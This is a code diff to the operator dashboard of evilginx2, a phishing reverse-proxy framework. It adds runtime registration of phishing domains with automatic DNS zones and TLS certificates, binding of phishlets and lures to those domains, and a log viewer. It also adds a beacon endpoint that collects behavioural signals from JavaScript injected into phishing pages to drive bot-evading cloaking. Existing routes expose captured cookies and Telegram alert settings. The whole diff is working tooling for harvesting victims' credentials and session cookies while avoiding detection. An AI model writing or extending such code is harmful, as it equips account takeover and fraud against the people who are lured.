@@ -1,6 +1,7 @@
 package dashboard
 
 import (
+	"context"
 	_ "embed"
 	"crypto/rand"
 	"encoding/hex"
@@ -18,18 +19,75 @@ import (
 
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 //go:embed index.html
 var indexHTML string
 
+// Log buffer for dashboard log viewer
+var (
+	logBuffer     []LogEntry
+	logBufferMu   sync.Mutex
+	maxLogEntries = 5000
+)
+
+type LogEntry struct {
+	Timestamp time.Time `json:"timestamp"`
+	Level     string    `json:"level"`
+	Message   string    `json:"message"`
+}
+
+// initLogCapture sets up log capture for dashboard
+func initLogCapture() {
+	log.SetHook(func(level string, msg string, fields map[string]interface{}) {
+		entry := LogEntry{
+			Timestamp: time.Now(),
+			Level:     level,
+			Message:   msg,
+		}
+		logBufferMu.Lock()
+		logBuffer = append(logBuffer, entry)
+		if len(logBuffer) > maxLogEntries {
+			logBuffer = logBuffer[len(logBuffer)-maxLogEntries:]
+		}
+		logBufferMu.Unlock()
+	})
+}
+
+func GetLogs(limit int, level string) []LogEntry {
+	logBufferMu.Lock()
+	defer logBufferMu.Unlock()
+	
+	if limit <= 0 || limit > len(logBuffer) {
+		limit = len(logBuffer)
+	}
+	
+	start := len(logBuffer) - limit
+	result := make([]LogEntry, limit)
+	copy(result, logBuffer[start:])
+	
+	if level != "" && level != "all" {
+		filtered := make([]LogEntry, 0, limit)
+		for _, e := range result {
+			if strings.EqualFold(e.Level, level) {
+				filtered = append(filtered, e)
+			}
+		}
+		return filtered
+	}
+	return result
+}
+
 var botAccessCount int64
 var botCountMu sync.Mutex
 
 func IncBotAccess() {
+	log.Debug("dashboard: IncBotAccess called")
 	botCountMu.Lock()
 	defer botCountMu.Unlock()
 	botAccessCount++
+	log.Debug("dashboard: botAccessCount now %d", botAccessCount)
 }
 
 func GetBotAccess() int64 {
@@ -169,6 +227,8 @@ type Dashboard struct {
 	authToken string
 	port      int
 	srv       *http.Server
+	ns        *core.Nameserver
+	crtDb     *core.CertDb
 }
 
 const (
@@ -267,7 +327,39 @@ func New(db *database.Database, cfg *core.Config, authToken string, port int) *D
 	}
 }
 
+// SetNameserver wires the DNS server so dashboard-added domains get an
+// authoritative zone at runtime (no restart needed).
+func (d *Dashboard) SetNameserver(ns *core.Nameserver) { d.ns = ns }
+
+// SetCertDb wires the certificate DB so TLS certs can be obtained/synced for
+// newly bound domains without a daemon restart.
+func (d *Dashboard) SetCertDb(crtDb *core.CertDb) { d.crtDb = crtDb }
+
+// refreshDomainsCerts re-obtains TLS certificates for every active hostname.
+// Called after a domain assignment/binding change so the new domain actually
+// serves HTTPS. Runs in the background — cert issuance can take up to ~60s.
+func (d *Dashboard) refreshDomainsCerts() {
+	if d.crtDb == nil {
+		return
+	}
+	hosts := d.cfg.GetActiveHostnames("")
+	if len(hosts) == 0 {
+		return
+	}
+	crtDb := d.crtDb
+	go func() {
+		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+		defer cancel()
+		if err := crtDb.SyncCertificates(ctx, hosts); err != nil {
+			log.Error("dashboard: TLS cert sync for new domain failed: %v", err)
+		}
+	}()
+}
+
 func (d *Dashboard) Start() error {
+	// Initialize log capture for dashboard log viewer
+	initLogCapture()
+	
 	mux := http.NewServeMux()
 
 	mux.HandleFunc("/api/login", d.corsMiddleware(d.handleLogin))
@@ -284,8 +376,13 @@ func (d *Dashboard) Start() error {
 	mux.HandleFunc("/api/lures/", d.corsMiddleware(d.authMiddleware(d.handleLureByID)))
 	mux.HandleFunc("/api/stats", d.corsMiddleware(d.authMiddleware(d.handleStats)))
 	mux.HandleFunc("/api/settings", d.corsMiddleware(d.authMiddleware(d.handleSettings)))
+	mux.HandleFunc("/api/domains", d.corsMiddleware(d.authMiddleware(d.handleDomains)))
+	mux.HandleFunc("/api/domains/", d.corsMiddleware(d.authMiddleware(d.handleDomainByName)))
+	mux.HandleFunc("/api/phishlet-domains", d.corsMiddleware(d.authMiddleware(d.handlePhishletDomains)))
 	mux.HandleFunc("/api/cookies/", d.corsMiddleware(d.authMiddleware(d.handleCookiesByID)))
-	mux.HandleFunc("/", d.corsMiddleware(d.handleFrontend))
+		mux.HandleFunc("/api/beacon", d.corsMiddleware(d.handleBeacon))
+		mux.HandleFunc("/api/logs", d.corsMiddleware(d.authMiddleware(d.handleLogs)))
+		mux.HandleFunc("/", d.corsMiddleware(d.handleFrontend))
 
 	d.srv = &http.Server{
 		Handler:      mux,
@@ -308,7 +405,7 @@ func (d *Dashboard) AuthToken() string {
 func (d *Dashboard) corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Access-Control-Allow-Origin", "*")
-		w.Header().Set("Access-Control-Allow-Methods", "GET, DELETE, OPTIONS")
+		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
 		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
 		if r.Method == "OPTIONS" {
 			w.WriteHeader(http.StatusOK)
@@ -642,8 +739,8 @@ func (d *Dashboard) handleStats(w http.ResponseWriter, r *http.Request) {
 func (d *Dashboard) handleSettings(w http.ResponseWriter, r *http.Request) {
 	switch r.Method {
 	case "GET":
-		writeJSON(w, http.StatusOK, map[string]string{
-			"chatid":   d.cfg.GetConfig().Chatid,
+		writeJSON(w, http.StatusOK, map[string]interface{}{
+			"chatid":    d.cfg.GetConfig().Chatid,
 			"teletoken": d.cfg.GetConfig().Teletoken,
 		})
 	case "PUT":
@@ -659,6 +756,105 @@ func (d *Dashboard) handleSettings(w http.ResponseWriter, r *http.Request) {
 		cfg.Chatid = body.Chatid
 		cfg.Teletoken = body.Teletoken
 		d.cfg.SaveConfig()
+		writeJSON(w, http.StatusOK, map[string]string{"status": "saved"})
+	default:
+		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
+	}
+}
+
+func (d *Dashboard) handleDomains(w http.ResponseWriter, r *http.Request) {
+	switch r.Method {
+	case "GET":
+		ds := d.cfg.GetDomainSettings()
+		writeJSON(w, http.StatusOK, map[string]interface{}{
+			"domains": ds.Domains,
+		})
+	case "POST":
+		var body struct {
+			Domain string `json:"domain"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
+			return
+		}
+		if !d.cfg.AddDashboardDomain(body.Domain) {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "domain empty or already exists"})
+			return
+		}
+		// Serve DNS for the new domain zone immediately (no restart needed).
+		if d.ns != nil {
+			d.ns.RegisterDomain(body.Domain)
+		}
+		writeJSON(w, http.StatusOK, map[string]string{"status": "added"})
+	default:
+		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
+	}
+}
+
+func (d *Dashboard) handleDomainByName(w http.ResponseWriter, r *http.Request) {
+	prefix := "/api/domains/"
+	if !strings.HasPrefix(r.URL.Path, prefix) {
+		http.NotFound(w, r)
+		return
+	}
+	domain, err := url.PathUnescape(r.URL.Path[len(prefix):])
+	if err != nil {
+		http.Error(w, `{"error":"invalid domain"}`, http.StatusBadRequest)
+		return
+	}
+	if r.Method != "DELETE" {
+		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
+		return
+	}
+	if !d.cfg.DeleteDashboardDomain(domain) {
+		writeJSON(w, http.StatusNotFound, map[string]string{"error": "domain not found"})
+		return
+	}
+	// The deleted domain's DNS zone stays registered (miekg/dns can't
+	// unregister a pattern) but no longer resolves usefully: any phishlet
+	// bindings pointing at it were dropped by DeleteDashboardDomain, so the
+	// hostnames leave the active list and the proxy stops serving them.
+	d.cfg.RefreshActiveHostnames()
+	d.refreshDomainsCerts()
+	writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
+}
+
+func (d *Dashboard) handlePhishletDomains(w http.ResponseWriter, r *http.Request) {
+	switch r.Method {
+	case "GET":
+		names := d.cfg.GetPhishletNames()
+		out := []map[string]string{}
+		for _, name := range names {
+			if !d.cfg.IsSiteEnabled(name) {
+				continue
+			}
+			out = append(out, map[string]string{
+				"phishlet": name,
+				"domain":   d.cfg.GetPhishletDashboardDomain(name),
+			})
+		}
+		writeJSON(w, http.StatusOK, map[string]interface{}{
+			"phishlets": out,
+			"domains":   d.cfg.GetDomainSettings().Domains,
+		})
+	case "PUT":
+		var body struct {
+			Phishlet string `json:"phishlet"`
+			Domain   string `json:"domain"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
+			return
+		}
+		if body.Phishlet == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "phishlet is required"})
+			return
+		}
+		if !d.cfg.SetPhishletDomain(body.Phishlet, body.Domain) {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid phishlet or domain"})
+			return
+		}
+		d.refreshDomainsCerts()
 		writeJSON(w, http.StatusOK, map[string]string{"status": "saved"})
 	default:
 		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
@@ -784,8 +980,7 @@ func (d *Dashboard) handlePhishlets(w http.ResponseWriter, r *http.Request) {
 		if !d.cfg.IsSiteEnabled(name) {
 			continue
 		}
-		domain, _ := d.cfg.GetSiteDomain(name)
-		out = append(out, phishletInfo{Name: name, Domain: domain})
+		out = append(out, phishletInfo{Name: name, Domain: d.cfg.GetPhishletDashboardDomain(name)})
 	}
 	writeJSON(w, http.StatusOK, map[string]interface{}{"phishlets": out})
 }
@@ -815,6 +1010,7 @@ func (d *Dashboard) handleLures(w http.ResponseWriter, r *http.Request) {
 	case "POST":
 		var body struct {
 			Phishlet string `json:"phishlet"`
+			Domain   string `json:"domain"`
 		}
 		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
 			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON"})
@@ -829,6 +1025,18 @@ func (d *Dashboard) handleLures(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		// If the caller selected a domain, activate it for this phishlet NOW
+		// (rebind hostname + refresh active hostnames) so the lure URL is
+		// generated on the new domain. This is what "Create Lure with domain X"
+		// must do — previously the binding was never switched, so lures kept
+		// coming out on the old domain.
+		if body.Domain != "" {
+			if !d.cfg.SetPhishletDomain(body.Phishlet, body.Domain) {
+				writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid phishlet or domain: '" + body.Domain + "' — add it in Domain Settings first"})
+				return
+			}
+		}
+
 		l := &core.Lure{
 			Path:     "/" + core.GenRandomString(8),
 			Phishlet: body.Phishlet,
@@ -836,7 +1044,13 @@ func (d *Dashboard) handleLures(w http.ResponseWriter, r *http.Request) {
 		d.cfg.AddLure(body.Phishlet, l)
 
 		idx := d.cfg.GetLuresCount() - 1
-		u, _ := d.cfg.GetLureURL(idx)
+		u, err := d.cfg.GetLureURL(idx)
+		if err != nil {
+			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "failed to resolve lure URL: " + err.Error()})
+			return
+		}
+		d.refreshDomainsCerts()
+
 		writeJSON(w, http.StatusOK, map[string]interface{}{
 			"lure": apiLure{
 				Id:       idx,
@@ -948,7 +1162,7 @@ func (d *Dashboard) sessionOpenURL(s *database.Session) string {
 		}
 	}
 	if base == "" {
-		if domain, ok := d.cfg.GetSiteDomain(s.Phishlet); ok && domain != "" {
+		if domain := d.cfg.GetPhishletDashboardDomain(s.Phishlet); domain != "" {
 			base = "https://" + domain
 		}
 	}
@@ -1018,3 +1232,67 @@ func writeJSON(w http.ResponseWriter, status int, v interface{}) {
 	w.WriteHeader(status)
 	json.NewEncoder(w).Encode(v)
 }
+
+// handleBeacon receives behavioral signals from the JS beacon injected into phishlet pages
+func (d *Dashboard) handleBeacon(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "method not allowed"})
+		return
+	}
+	
+	var data map[string]interface{}
+	if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json"})
+		return
+	}
+	
+	// Get client IP
+	ip := r.Header.Get("CF-Connecting-IP")
+	if ip == "" {
+		ip = r.Header.Get("X-Forwarded-For")
+		if ip != "" {
+			ips := strings.Split(ip, ",")
+			ip = strings.TrimSpace(ips[0])
+		}
+	}
+	if ip == "" {
+		ip = r.Header.Get("X-Real-IP")
+	}
+	if ip == "" {
+		host, _, _ := net.SplitHostPort(r.RemoteAddr)
+		ip = host
+	}
+	
+	// Record behavior
+		if bt, ok := data["type"].(string); ok {
+			core.GetCloak().RecordBehavior(ip, bt)
+		}
+
+		w.WriteHeader(http.StatusNoContent)
+	}
+
+	// handleLogs returns recent log entries for the dashboard log viewer
+	func (d *Dashboard) handleLogs(w http.ResponseWriter, r *http.Request) {
+		if r.Method != "GET" {
+			writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "method not allowed"})
+			return
+		}
+
+		// Parse query params
+		limit := 200
+		level := ""
+		if l := r.URL.Query().Get("limit"); l != "" {
+			if v, err := strconv.Atoi(l); err == nil && v > 0 && v <= 5000 {
+				limit = v
+			}
+		}
+		if lvl := r.URL.Query().Get("level"); lvl != "" {
+			level = lvl
+		}
+
+		logs := GetLogs(limit, level)
+		writeJSON(w, http.StatusOK, map[string]interface{}{
+			"logs": logs,
+			"total": len(logs),
+		})
+	}
